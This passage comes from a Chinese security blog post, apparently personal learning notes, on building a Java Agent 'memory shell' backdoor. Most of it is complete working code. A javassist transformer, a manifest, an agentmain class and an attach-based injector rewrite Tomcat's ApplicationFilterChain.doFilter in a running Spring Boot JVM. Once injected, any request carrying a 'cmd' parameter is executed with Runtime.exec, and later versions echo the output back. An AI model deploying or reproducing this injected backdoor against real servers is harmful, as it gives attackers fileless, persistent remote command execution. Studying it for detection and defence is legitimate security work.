class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.example.Main&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;Hello&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们的MF文件需要修改成如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br><br></code></pre></td></tr></table></figure><p>然后直接用maven打jar包</p><p><img src="https://cdn.clown2024.cn/image-20241031113452048.png" alt="image-20241031113452048"></p><blockquote><p>maven打成jar包有一个坑点，他会默认替换你的MF文件变成这样</p><p><img src="https://cdn.clown2024.cn/image-20241031114835052.png" alt="image-20241031114835052"></p><p>我们可以手动替换一下jar包里面的MF文件，或者我们可以配置一下maven的打包插件让他自动生成MF文件</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--自动添加META-INF/MANIFEST.MF --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br><span class="hljs-comment">&lt;!--                            &lt;Premain-Class&gt;org.example.Agent.premainAgent&lt;/Premain-Class&gt;--&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Agent-Class</span>&gt;</span>org.example.Agent.agentmainAgent<span class="hljs-tag">&lt;/<span class="hljs-name">Agent-Class</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在再打包就有需要的属性了</p><p><img src="https://cdn.clown2024.cn/image-20241031115458888.png" alt="image-20241031115458888"></p></blockquote><p>最后编写Agent的注入类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行效果如下：</p><blockquote><p>不过如果想要用javassist来修改的话，目标类也需要引入javassist依赖才行，不然会报错</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241031115558447.png" alt="image-20241031115558447"></p><h2 id="instrumentation的局限"><a href="#Instrumentation的局限" class="headerlink" title="Instrumentation的局限"></a>Instrumentation的局限</h2><p>premain 和 agentmain 两种方式<strong>修改字节码</strong>的时机都是类文件加载之后，不能通过字节码文件和自定义的类名重新定义一个本来不存在的类。</p><p>类的字节码修改称为类转换 (Class Transform)，类转换其实最终都回归到类重定义 <code>Instrumentation#redefineClasses</code> 方法，此方法有以下限制：</p><ol><li>新类和老类的父类必须相同</li><li>新类和老类实现的接口数也要相同，并且是相同的接口</li><li>新类和老类访问符必须一致。 </li><li>新类和老类字段数和字段名要一致</li><li>新类和老类新增或删除的方法必须是 private static&#x2F;final 修饰的</li><li>可以修改方法体</li></ol><h1 id="java-agent实现spring-filter内存马"><a href="#Java-Agent实现Spring-Filter内存马" class="headerlink" title="Java Agent实现Spring Filter内存马"></a>Java Agent实现Spring Filter内存马</h1><p>因为springboot内置了Tomcat服务，所以我们找到Filter链中一定会执行的方法，然后重写他即可</p><p>他的流程为ApplicationFilterChain#doFilter&#x3D;&#x3D;》ApplicationFilterChain#internalDoFilter</p><p><img src="https://cdn.clown2024.cn/image-20241031170819582.png" alt="image-20241031170819582"></p><p><img src="https://cdn.clown2024.cn/image-20241031170835475.png" alt="image-20241031170835475"></p><p>这两个方法都能够拿到ServletRequest 和 ServletResponse，而且hook不会影响正常业务逻辑</p><p>所以我们重写ApplicationFilterChain#internalDoFilter或者doFilter方法来打入内存马即可</p><h2 id="编写agent内存马"><a href="#编写agent内存马" class="headerlink" title="编写agent内存马"></a>编写agent内存马</h2><p>照例先实现一个ClassFileTransformer，这里的ServletRequest需要我们自己去源码看一下具体是什么类，这里是jakarta.servlet.ServletRequest</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.ServletRequest request = $1\n;&quot;</span> + <span class="hljs-comment">//$1为第一个参数，也就是request请求实例</span><br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd !=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  Runtime.getRuntime().exec(cmd);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>agentmain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//获取所有已加载的类</span><br>        <span class="hljs-comment">//获取目标JVM加载的全部类</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>))&#123;<br>                <span class="hljs-comment">//添加一个transformer到Instrumentation，并重新触发目标类加载</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>MF文件就和前面一样，这里就不再写出来了</p><p>最后是Inject类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//调用VirtualMachine.list()获取正在运行的JVM列表</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        System.out.println(list);<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//遍历每一个正在运行的JVM，如果JVM名称为目标类则连接该JVM并加载特定Agent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.dev.DevApplication&quot;</span>)) &#123;<br>                <span class="hljs-comment">//连接指定JVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//加载Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;成功插入agent&quot;</span>);<br>                <span class="hljs-comment">//断开JVM连接</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里还有一个很坑的点，就是版本问题，我们的javaagent的jar包和inject类都需要是符合目标的jdk版本的，估计是低版本不能向高版本注入的问题</p><p>现在我们吧springboot服务开起来，然后启动inject注入agent就可以打入内存马了</p><p><img src="https://cdn.clown2024.cn/image-20241031204330693.png" alt="image-20241031204330693"></p><p><img src="https://cdn.clown2024.cn/image-20241031204345365.png" alt="image-20241031204345365"></p><p>我看有些文章可以将inject类写成jar包，传入vm的pid和agent的jar包参数就能命令行执行了，不过需要相关的内存工具来获取pid才行。</p><h2 id="agent内存马回显问题"><a href="#agent内存马回显问题" class="headerlink" title="agent内存马回显问题"></a>agent内存马回显问题</h2><p>这里的简单内存马不带回显感觉不方便，我又去网上找了一下有回显的写法，ClassFileTransformer就可以改成下面这样</p><p>参考这篇文章：<a href="https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/">https://sec.1i6w31fen9.top/2023/09/24/javaagent-memory-trojan/</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;internalDoFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体,带回显</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;jakarta.servlet.http.HttpServletRequest request = $1\n;&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = $2.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;  &#125;else&#123;internalDoFilter($1,$2);&#125;&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<span class="hljs-comment">//在方法前插入代码</span><br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            ctClass.detach();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>emmm但是有个很奇怪的问题，他每次请求完就会卡住，然后就报下面的错误：</p><p><img src="https://cdn.clown2024.cn/image-20241031215713085.png" alt="image-20241031215713085"></p><p>意思是JVM在运行的时候找不到类的定义，这就很奇怪了，然后试了很多其他的操作发现都是报这个错误，只有前面那个简单的内存马能通，不知道为什么</p><p>我直接copy了他的整个doFilter方法也不行红温了😡</p><p>fuck我改了一晚上终于行了，这是成功的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取CtClass 对象的容器 ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//添加额外的类搜索路径</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//获取目标类</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//获取目标方法</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;doFilter&quot;</span>);<br>            <span class="hljs-comment">//设置方法体</span><br>            String body=<span class="hljs-string">&quot;&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletRequest req = $1;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;final jakarta.servlet.ServletResponse res = $2;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;try &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;String cmd=req.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;if (cmd!=null)&#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.io.PrintWriter writer = res.getWriter();&quot;</span> +<br>                    <span class="hljs-string">&quot;java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(\&quot;\\\\A\&quot;);&quot;</span> +<br>                    <span class="hljs-string">&quot;String result = scanner.hasNext()?scanner.next():\&quot;\&quot;;&quot;</span> +<br>                    <span class="hljs-string">&quot;scanner.close();writer.write(result);&quot;</span> +<br>                    <span class="hljs-string">&quot;writer.flush();writer.close();\n&quot;</span> +<br>                    <span class="hljs-string">&quot;internalDoFilter(req, res);\n&quot;</span> +<br>                    <span class="hljs-string">&quot;return null;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span>+<br>                    <span class="hljs-string">&quot;&#125; catch (java.lang.Exception pe) &#123;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;\n&quot;</span> +<br>                    <span class="hljs-string">&quot;&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//返回目标类字节码</span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果只需要比前面那个多一段**internalDoFilter(req, res);**方法的调用就可以了，我估计是不调用该方法调用链就会直接断掉，导致我发请求就卡在那里不动</p><p><img src="https://cdn.clown2024.cn/image-20241031231112320.png" alt="image-20241031231112320"></p><p>而且这种方法写如果弹计算器的话他会弹五次，说明他调用链中走了五次doFilter方法</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&u_asig=1a0c384b17302758676971458e00f7&time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt+teD">https://xz.aliyun.com/t/9450?u_atoken=bf936a9b17ff00a7cb14f93f2e5272de&amp;u_asig=1a0c384b17302758676971458e00f7&amp;time__1311=iq0hYKAIqjOD7DloNGkDulDRibGCbbUnt%2BteD</a></p><p><a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;java-agent介绍&quot;&gt;&lt;a href=&quot;#Java-Agent介绍&quot; class=&quot;headerlink&quot; title=&quot;Java Agent介绍&quot;&gt;&lt;/a&gt;Java Agent介绍&lt;/h1&gt;&lt;p&gt;官方文档：&lt;a href=&quot;https://docs.ora</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
</feed>
